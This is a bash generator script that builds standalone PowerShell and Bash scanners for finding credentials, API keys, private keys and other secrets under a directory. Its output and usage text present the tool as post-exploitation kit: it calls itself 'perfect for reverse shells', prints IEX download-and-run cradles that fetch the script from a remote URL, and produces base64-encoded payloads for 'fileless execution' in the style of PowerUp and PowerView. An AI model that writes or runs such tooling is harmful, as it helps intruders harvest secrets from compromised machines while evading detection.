#!/bin/bash

# File Scanner Generator v2.0
# Generates clean standalone scripts with pre-built commands (no parsing needed)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${SCRIPT_DIR}/filescanner.config"
OUTPUT_PS1="${SCRIPT_DIR}/filescanner_standalone.ps1"
OUTPUT_SH="${SCRIPT_DIR}/filescanner_standalone.sh"

echo "=== File Scanner Generator v2.0 ==="
echo "Reading config from: $CONFIG_FILE"
echo ""

# Check if config exists
if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "Error: Config file not found: $CONFIG_FILE"
    exit 1
fi

# Arrays to store parsed sections
declare -a SECTION_NAMES=()
declare -a LINUX_COMMANDS=()
declare -a WINDOWS_COMMANDS=()

# Parse config file
current_section=""
linux_cmd=""
windows_cmd=""
keywords=""
extensions=""
files=""

echo "Parsing config..."

build_linux_command() {
    local cmd="$1"
    local kw="$2"
    local ext="$3"
    local fls="$4"
    
    # Replace KEYWORDS
    if [[ -n "$kw" ]] && [[ "$cmd" == *"KEYWORDS"* ]]; then
        local keyword_pattern=$(echo "$kw" | sed 's/, */|/g')
        cmd="${cmd//KEYWORDS/$keyword_pattern}"
    fi
    
    # Replace EXTENSIONS (grep style)
    if [[ -n "$ext" ]] && [[ "$cmd" == *"EXTENSIONS"* ]]; then
        if [[ "$cmd" == *"grep"* ]]; then
            local include_flags=""
            IFS=',' read -ra EXTS <<< "$ext"
            for e in "${EXTS[@]}"; do
                e=$(echo "$e" | xargs)
                include_flags="$include_flags --include=\"$e\""
            done
            cmd="${cmd//EXTENSIONS/$include_flags}"
        elif [[ "$cmd" == *"find"* ]]; then
            local name_flags="\\("
            IFS=',' read -ra EXTS <<< "$ext"
            local first=true
            for e in "${EXTS[@]}"; do
                e=$(echo "$e" | xargs)
                if [[ "$first" == true ]]; then
                    name_flags="$name_flags -name \"$e\""
                    first=false
                else
                    name_flags="$name_flags -o -name \"$e\""
                fi
            done
            name_flags="$name_flags \\)"
            cmd="${cmd//EXTENSIONS/$name_flags}"
        fi
    fi
    
    # Replace FILES
    if [[ -n "$fls" ]] && [[ "$cmd" == *"FILES"* ]]; then
        local name_flags="\\("
        IFS=',' read -ra FILES_ARR <<< "$fls"
        local first=true
        for f in "${FILES_ARR[@]}"; do
            f=$(echo "$f" | xargs)
            if [[ "$first" == true ]]; then
                name_flags="$name_flags -name \"$f\""
                first=false
            else
                name_flags="$name_flags -o -name \"$f\""
            fi
        done
        name_flags="$name_flags \\)"
        cmd="${cmd//FILES/$name_flags}"
    fi
    
    echo "$cmd"
}

build_windows_command() {
    local cmd="$1"
    local kw="$2"
    local ext="$3"
    local fls="$4"
    
    # Replace KEYWORDS
    if [[ -n "$kw" ]] && [[ "$cmd" == *"KEYWORDS"* ]]; then
        local keyword_pattern=$(echo "$kw" | sed 's/, */|/g')
        keyword_pattern=$(echo "$keyword_pattern" | sed "s/'/''/g")
        cmd="${cmd//KEYWORDS/$keyword_pattern}"
    fi
    
    # Replace EXTENSIONS (Robust Array)
    if [[ -n "$ext" ]] && [[ "$cmd" == *"EXTENSIONS"* ]]; then
        local clean_ext=$(echo "$ext" | sed "s/'/''/g")
        local include_list=$(echo "$clean_ext" | sed "s/[[:space:]]*,[[:space:]]*/','/g")
        cmd="${cmd//EXTENSIONS/-Include @('$include_list')}"
    fi
    
    # Replace FILES (Robust Array)
    if [[ -n "$fls" ]] && [[ "$cmd" == *"FILES"* ]]; then
        local clean_fls=$(echo "$fls" | sed "s/'/''/g")
        local include_list=$(echo "$clean_fls" | sed "s/[[:space:]]*,[[:space:]]*/','/g")
        cmd="${cmd//FILES/-Include @('$include_list')}"
    fi

    # SAFETY: If FILES or EXTENSIONS remain (because var was empty), remove them to prevent syntax errors
    cmd="${cmd//EXTENSIONS/}"
    cmd="${cmd//FILES/}"
    
    echo "$cmd"
}

process_section() {
    if [[ -n "$linux_cmd" ]] && [[ -n "$windows_cmd" ]]; then
        # Build actual commands
        local final_linux=$(build_linux_command "$linux_cmd" "$keywords" "$extensions" "$files")
        local final_windows=$(build_windows_command "$windows_cmd" "$keywords" "$extensions" "$files")
        
        SECTION_NAMES+=("$current_section")
        LINUX_COMMANDS+=("$final_linux")
        WINDOWS_COMMANDS+=("$final_windows")
        
        echo "  ✓ $current_section"
    fi
    
    # Reset
    linux_cmd=""
    windows_cmd=""
    keywords=""
    extensions=""
    files=""
}

while IFS= read -r line || [[ -n "$line" ]]; do
    line=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    
    # Skip empty lines and comments
    [[ -z "$line" ]] || [[ "$line" =~ ^# ]] && continue
    
    # Section header
    if [[ "$line" =~ ^\[(.+)\]$ ]]; then
        process_section
        current_section="${BASH_REMATCH[1]}"
        continue
    fi
    
    # Parse fields with flexible regex (handles tabs/spaces)
    if [[ "$line" =~ ^"Linux Command:"[[:space:]]*(.+)$ ]]; then
        linux_cmd="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^"Windows Command:"[[:space:]]*(.+)$ ]]; then
        windows_cmd="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^"Keywords:"[[:space:]]*(.+)$ ]]; then
        keywords="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^"Extensions:"[[:space:]]*(.+)$ ]]; then
        extensions="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^"Files:"[[:space:]]*(.+)$ ]]; then
        files="${BASH_REMATCH[1]}"
    fi
done < "$CONFIG_FILE"

# Process last section
process_section

echo ""
echo "Parsed ${#SECTION_NAMES[@]} sections"
echo ""

# Generate PowerShell standalone
echo "Generating standalone PowerShell script..."

cat > "$OUTPUT_PS1" << 'PS_HEADER'
# File Scanner - PowerShell Module
# Auto-generated with pre-built commands - no parsing needed!
#
# USAGE:
#   1. IEX + call:         IEX (IWR url/scanner.ps1 -UseBasicParsing).Content; Invoke-FileScan C:\path
#   2. Dot-source + call:  . .\scanner.ps1; Invoke-FileScan -SearchRoot C:\path
#   3. Direct call:        Import-Module .\scanner.ps1; Invoke-FileScan C:\path
#
# PERFECT FOR REVERSE SHELLS - Just IEX and call the function!

function Invoke-FileScan {
<#
.SYNOPSIS
    Security-focused file scanner for credentials, keys, and sensitive data

.DESCRIPTION
    Scans directories for credentials, API keys, private keys, certificates,
    database files, configuration files, and other sensitive information.
    
    Pre-built search commands - no config parsing at runtime!

.PARAMETER SearchRoot
    Root directory to search (REQUIRED)

.PARAMETER OutputFile
    Output file path (default: findings_YYYYMMDD_HHMMSS.txt)

.PARAMETER Verbose
    Show detailed output including commands being run

.EXAMPLE
    Invoke-FileScan -SearchRoot C:\inetpub\wwwroot

.EXAMPLE  
    Invoke-FileScan -SearchRoot C:\Projects -Verbose

.EXAMPLE
    Invoke-FileScan -SearchRoot C:\ -OutputFile results.txt
    
.EXAMPLE
    # After IEX / dot-sourcing
    Invoke-FileScan C:\temp -Verbose

.NOTES
    Can be used standalone or loaded into session like PowerUp/PowerView
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$SearchRoot,
        
        [Parameter(Mandatory=$false)]
        [string]$OutputFile = "findings_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    )

    # Validate
    if (-not (Test-Path $SearchRoot)) {
        Write-Error "Search root does not exist: $SearchRoot"
        return
    }

    # Create output directory
    $outputDir = Split-Path -Parent $OutputFile
    if ($outputDir -and -not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }

    # Initialize output file
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    @(
        "=" * 80
        "File Scanner Results"
        "=" * 80
        "Scan started: $timestamp"
        "Search root: $SearchRoot"
        "Output file: $OutputFile"
        "=" * 80
        ""
    ) | Out-File -FilePath $OutputFile -Encoding UTF8

    Write-Host "[*] File Scanner - Module Mode" -ForegroundColor Cyan
    Write-Host "[*] Search Root: $SearchRoot" -ForegroundColor Cyan
    Write-Host "[*] Output File: $OutputFile" -ForegroundColor Cyan
    Write-Host ""

    # Helper function to log
    function Log {
        param([string]$message, [bool]$toConsole = $false)
        if ($toConsole -or $VerbosePreference -eq 'Continue') {
            Write-Host $message
        }
        Add-Content -Path $OutputFile -Value $message
    }

    # Function to run each section
    function Run-Section {
        param(
            [string]$name,
            [string]$command
        )
        
        Log "`n=== $name ===" $true
        
        if ($VerbosePreference -eq 'Continue') {
            Log "Command: $command" $true
        }
        
        try {
            # Replace placeholder - use escaped quotes for paths with spaces
            $actualCmd = $command.Replace('$SEARCH_ROOT', $SearchRoot)
            
            # Execute
            $results = Invoke-Expression $actualCmd 2>$null
            
            if ($results) {
                if ($results -is [Array]) {
                    foreach ($result in $results) {
                        Log $result ($VerbosePreference -eq 'Continue')
                    }
                } else {
                    Log $results ($VerbosePreference -eq 'Continue')
                }
                Log "Found $($results.Count) results" $true
            } else {
                if ($VerbosePreference -eq 'Continue') {
                    Log "No findings" $true
                }
            }
        } catch {
            Log "Error: $_" $true
        }
    }

    # Execute all scan sections
PS_HEADER

# Add each section as a function call
for ((i=0; i<${#SECTION_NAMES[@]}; i++)); do
    section_name="${SECTION_NAMES[$i]}"
    windows_cmd="${WINDOWS_COMMANDS[$i]}"
    
    # For PowerShell: Use single-quoted strings (@'...'@) for the command to avoid all escaping
    # Only the section name needs quote escaping
    section_name_escaped=$(echo "$section_name" | sed "s/'/''/ g")
    
    # Write using PowerShell's here-string for the command (avoids all escaping issues)
    cat >> "$OUTPUT_PS1" << EOF
Run-Section '$section_name_escaped' @'
$windows_cmd
'@
EOF
done

# Add footer
cat >> "$OUTPUT_PS1" << 'PS_FOOTER'

    # Write footer
    @(
        ""
        "=" * 80
        "Scan completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        "Results saved to: $OutputFile"
        "=" * 80
    ) | Add-Content -Path $OutputFile

    Write-Host ""
    Write-Host "[+] Scan Complete!" -ForegroundColor Green
    Write-Host "[+] Results saved to: $OutputFile" -ForegroundColor Green
    Write-Host ""
    
    # Return output file path
    return $OutputFile
}

# Function is now loaded and ready to use
# Call it with: Invoke-FileScan -SearchRoot C:\path
PS_FOOTER

echo "✓ Generated: $OUTPUT_PS1"

# Generate Base64 encoded PowerShell (for fileless execution)
echo ""
echo "Generating base64 encoded PowerShell (fileless execution)..."
OUTPUT_PS1_B64="${SCRIPT_DIR}/filescanner_standalone_encoded.txt"

# Encode with no line wrapping and remove any potential issues
base64 -w 0 "$OUTPUT_PS1" | tr -d '\n\r' > "$OUTPUT_PS1_B64"

echo "✓ Generated: $OUTPUT_PS1_B64"
echo ""
echo "  Fileless execution usage:"
echo '    $c = (Get-Content filescanner_standalone_encoded.txt -Raw).Trim()'
echo '    $d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))'
echo '    IEX $d'

# Generate Bash standalone
echo "Generating standalone Bash script..."

cat > "$OUTPUT_SH" << 'BASH_HEADER'
#!/bin/bash

# File Scanner - Standalone Bash Version
# Auto-generated with pre-built commands - no parsing needed!

# Default values
SEARCH_ROOT=""
OUTPUT_FILE="findings_$(date +%Y%m%d_%H%M%S).txt"
VERBOSE=false

show_help() {
    cat << EOF
File Scanner - Standalone Bash Edition
Pre-built commands - fast and simple!

USAGE:
    ./filescanner_standalone.sh -r <path> [options]

OPTIONS:
    -r, --root DIR      Root directory to search (REQUIRED)
    -o, --output FILE   Output file path (default: findings_YYYYMMDD_HHMMSS.txt)
    -v, --verbose       Show detailed output
    -h, --help          Show this help message

EXAMPLES:
    ./filescanner_standalone.sh -r /var/www
    ./filescanner_standalone.sh -r /home/user/projects -v
    ./filescanner_standalone.sh -r /opt/app -o results.txt

EOF
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        -r|--root)
            SEARCH_ROOT="$2"
            shift 2
            ;;
        -o|--output)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Validate
if [[ -z "$SEARCH_ROOT" ]]; then
    echo "Error: Search root must be specified with -r"
    exit 1
fi

if [[ ! -d "$SEARCH_ROOT" ]]; then
    echo "Error: Directory does not exist: $SEARCH_ROOT"
    exit 1
fi

# Create output directory
OUTPUT_DIR=$(dirname "$OUTPUT_FILE")
mkdir -p "$OUTPUT_DIR" 2>/dev/null

run_section() {
    local name="$1"
    local command="$2"
    
    if [[ "$VERBOSE" == true ]]; then
        echo -e "\n=== $name ===" | tee -a "$OUTPUT_FILE"
        echo "> Running: $command" | tee -a "$OUTPUT_FILE"
    else
        echo -e "\n=== $name ===" >> "$OUTPUT_FILE"
    fi
    
    # Replace placeholder in command
    local actual_cmd="${command//\$SEARCH_ROOT/\"$SEARCH_ROOT\"}"
    
    # Execute command
    if [[ "$VERBOSE" == true ]]; then
        eval "$actual_cmd" 2>/dev/null | tee -a "$OUTPUT_FILE" || true
    else
        eval "$actual_cmd" 2>/dev/null >> "$OUTPUT_FILE" || true
    fi
}

# Write header
{
    echo "Starting search from: $SEARCH_ROOT"
    echo "Started: $(date)"
    echo "========================================"
} > "$OUTPUT_FILE"

[[ "$VERBOSE" == true ]] && cat "$OUTPUT_FILE"

# === SCAN SECTIONS ===
# Auto-generated commands below

BASH_HEADER

# Add each section as a function call
for ((i=0; i<${#SECTION_NAMES[@]}; i++)); do
    section_name="${SECTION_NAMES[$i]}"
    linux_cmd="${LINUX_COMMANDS[$i]}"
    
    # Escape single quotes for bash
    linux_cmd_escaped=$(echo "$linux_cmd" | sed "s/'/'\\\\''/g")
    
    cat >> "$OUTPUT_SH" << EOF
run_section '$section_name' '$linux_cmd_escaped'
EOF
done

# Add footer
cat >> "$OUTPUT_SH" << 'BASH_FOOTER'

# Footer
{
    echo ""
    echo "========================================"
    echo "Completed: $(date)"
} >> "$OUTPUT_FILE"

[[ "$VERBOSE" == true ]] && tail -3 "$OUTPUT_FILE"

echo "Results saved to: $OUTPUT_FILE"
BASH_FOOTER

chmod +x "$OUTPUT_SH"

echo "✓ Generated: $OUTPUT_SH"
echo ""
echo "=== Generation Complete ==="
echo ""
echo "Generated ${#SECTION_NAMES[@]} scan sections"
echo ""
echo "Standalone scripts created:"
echo "  PowerShell (normal):  $OUTPUT_PS1"
echo "  PowerShell (base64):  $OUTPUT_PS1_B64"
echo "  Bash:                 $OUTPUT_SH"
echo ""
echo "PowerShell Usage (Module-Style):"
echo "  1. IEX + Function:     IEX (IWR url/scanner.ps1 -UseBasicParsing).Content; Invoke-FileScan C:\\path"
echo "  2. Dot-source:         . .\\scanner.ps1; Invoke-FileScan -SearchRoot C:\\path"
echo "  3. Direct (old way):   .\\scanner.ps1 -SearchRoot C:\\path"
echo ""
echo "Base64 Usage (Fileless):"
echo "  \$c=(IWR url/encoded.txt -UseBasicParsing).Content.Trim(); \$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$c)); IEX \$d; Invoke-FileScan C:\\"
echo ""
echo "Bash Usage:"
echo "  ./filescanner_standalone.sh -r /path"
echo ""
echo "Perfect for:"
echo "  - Reverse shells (IEX + Invoke-FileScan)"
echo "  - Fileless execution (base64)"
echo "  - Module-style like PowerUp.ps1"
echo ""
